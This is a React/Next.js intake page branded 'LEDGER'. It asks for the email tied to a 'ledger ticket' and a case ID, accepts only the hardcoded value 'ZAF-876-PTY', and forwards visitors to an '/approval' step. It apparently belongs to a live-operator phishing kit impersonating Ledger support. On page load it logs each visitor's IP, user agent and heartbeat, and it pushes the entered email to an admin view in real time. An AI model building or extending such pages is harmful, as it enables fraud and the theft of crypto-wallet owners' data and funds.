"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import type { UserActivity } from "@/lib/activity-store"
import { useHeartbeat } from "@/hooks/use-heartbeat"
import { LedgerFooter } from "@/components/ledger-footer"

function generateVisitorId() {
  return "visitor_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36)
}

export default function IntakePage() {
  const router = useRouter()
  const [step, setStep] = useState<"email" | "caseId">("email")
  const [email, setEmail] = useState("")
  const [caseId, setCaseId] = useState("")
  const [visitorId, setVisitorId] = useState("")
  const [emailError, setEmailError] = useState("")
  const [caseIdError, setCaseIdError] = useState("")
  const [isNavigating, setIsNavigating] = useState(false)

  useHeartbeat(visitorId)

  useEffect(() => {
    let id = localStorage.getItem("visitorId")
    if (!id) {
      id = generateVisitorId()
      localStorage.setItem("visitorId", id)
    }
    setVisitorId(id)

    // Create activity immediately so admin can see the session
    const initActivity = async () => {
      const ipRes = await fetch("/api/ip")
      const ipData = await ipRes.json()

      const existing = await fetch(`/api/activity?visitorId=${id}`)
      const existingData = await existing.json()

      // Only create if no activity exists yet
      if (!existingData.activity) {
        const activity: UserActivity = {
          visitorId: id!,
          ipAddress: ipData.ip,
          currentStage: "intake",
          email: "",
          caseId: "",
          decisions: [],
          sessionStarted: new Date().toISOString(),
          lastUpdated: new Date().toISOString(),
          lastHeartbeat: new Date().toISOString(),
          isOnline: true,
          userAgent: navigator.userAgent,
        }

        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId: id, activity }),
        })
      }
    }

    initActivity()
  }, [])

  const handleEmailNext = async () => {
    if (!email.includes("@")) {
      setEmailError("Please enter a valid email address")
      return
    }
    setEmailError("")

    // Sync email to activity so admin can see it
    if (visitorId) {
      const res = await fetch(`/api/activity?visitorId=${visitorId}`)
      const data = await res.json()
      if (data.activity) {
        const activity: UserActivity = {
          ...data.activity,
          email: email.trim(),
          lastUpdated: new Date().toISOString(),
        }
        await fetch("/api/activity", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ visitorId, activity }),
        })
      }
    }

    setStep("caseId")
  }

  const handleCaseIdNext = async () => {
    if (isNavigating) return
    if (caseId.trim() !== "ZAF-876-PTY") {
      setCaseIdError("Invalid Case ID")
      return
    }
    setCaseIdError("")
    setIsNavigating(true)

    const res = await fetch(`/api/activity?visitorId=${visitorId}`)
    const data = await res.json()

    const activity: UserActivity = {
      ...(data.activity || {}),
      visitorId,
      currentStage: "intake",
      email: email.trim(),
      caseId: caseId.trim(),
      decisions: data.activity?.decisions || [],
      lastUpdated: new Date().toISOString(),
      lastHeartbeat: new Date().toISOString(),
      isOnline: true,
      userAgent: navigator.userAgent,
    }

    await fetch("/api/activity", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ visitorId, activity }),
    })

    router.push("/approval")
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <header className="border-b border-border">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex items-center justify-between h-16">
            <div className="flex items-center">
              <div className="relative flex items-center">
                <span
                  className="absolute -top-0.5 -left-1 w-2.5 h-2.5 border-l-2 border-t-2 border-foreground"
                  aria-hidden="true"
                />
                <span className="font-bold text-foreground tracking-[0.2em] text-sm px-3 py-1">LEDGER</span>
                <span
                  className="absolute -bottom-0.5 -right-1 w-2.5 h-2.5 border-r-2 border-b-2 border-foreground"
                  aria-hidden="true"
                />
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 sm:py-8">
        <div className="max-w-md mx-auto">
          {step === "email" ? (
            <>
              <h1 className="text-base sm:text-2xl font-semibold text-foreground mb-6 sm:mb-8 text-left">
                Enter the email address used to create your ledger ticket
              </h1>

              <div className="space-y-4 sm:space-y-5">
                <div className="space-y-2">
                  <label className="text-xs sm:text-sm text-muted-foreground">Email Address</label>
                  <Input
                    type="email"
                    placeholder="you@example.com"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value)
                      if (emailError) setEmailError("")
                    }}
                    className={`bg-secondary text-sm sm:text-base h-10 sm:h-11 ${emailError ? "border-destructive" : "border-border"}`}
                  />
                  {emailError && <p className="text-xs text-destructive">{emailError}</p>}
                </div>

                <Button
                  onClick={handleEmailNext}
                  className="w-full bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 focus-visible:ring-2 focus-visible:ring-foreground focus-visible:ring-offset-2 focus-visible:ring-offset-background"
                >
                  Next
                </Button>
              </div>
            </>
          ) : (
            <>
              <h1 className="text-lg sm:text-2xl font-semibold text-foreground mb-6 sm:mb-8 leading-snug">
                Enter your case ID to continue
              </h1>

              <div className="space-y-4 sm:space-y-5">
                <div className="space-y-2">
                  <label className="text-xs sm:text-sm text-muted-foreground">Case ID</label>
                  <Input
                    type="text"
                    placeholder="Enter your case ID"
                    value={caseId}
                    onChange={(e) => {
                      setCaseId(e.target.value)
                      if (caseIdError) setCaseIdError("")
                    }}
                    className={`bg-secondary text-sm sm:text-base h-10 sm:h-11 ${caseIdError ? "border-destructive" : "border-border"}`}
                  />
                  {caseIdError && <p className="text-xs text-destructive">{caseIdError}</p>}
                </div>

                <div className="flex gap-3">
                  <Button
                    variant="outline"
                    onClick={() => {
                      setStep("email")
                      setCaseIdError("")
                    }}
                    className="flex-1 bg-transparent border-border hover:bg-secondary h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95"
                  >
                    Back
                  </Button>
                  <Button
                    onClick={handleCaseIdNext}
                    disabled={isNavigating}
                    className="flex-1 bg-foreground text-background hover:bg-foreground/80 h-10 sm:h-11 text-sm sm:text-base cursor-pointer transition-all duration-200 hover:scale-105 active:scale-95 disabled:opacity-50 disabled:cursor-not-allowed disabled:hover:scale-100"
                  >
                    {isNavigating ? "Loading..." : "Next"}
                  </Button>
                </div>
              </div>
            </>
          )}
        </div>
      </main>

      <LedgerFooter />
    </div>
  )
}
